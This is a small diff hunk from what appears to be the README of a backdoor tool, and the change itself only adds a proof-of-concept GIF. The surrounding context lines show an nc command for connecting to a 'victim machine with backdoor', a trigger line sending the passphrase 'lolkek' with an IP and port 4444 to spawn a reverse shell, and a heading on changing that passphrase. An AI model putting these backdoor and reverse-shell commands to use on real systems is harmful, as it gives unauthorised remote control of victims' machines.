@@ -53,6 +53,8 @@ nc 192.168.1.100 22 # connect to victim machine with backdoor to any open port
 lolkek 192.168.123.200 4444
 ```
 
+![alt text](assets/poc.gif)
+
 ## Changing the Passphrase for the Reverse Shell
 For now the passphrase that triggers the reverse shell is `lolkek`
 
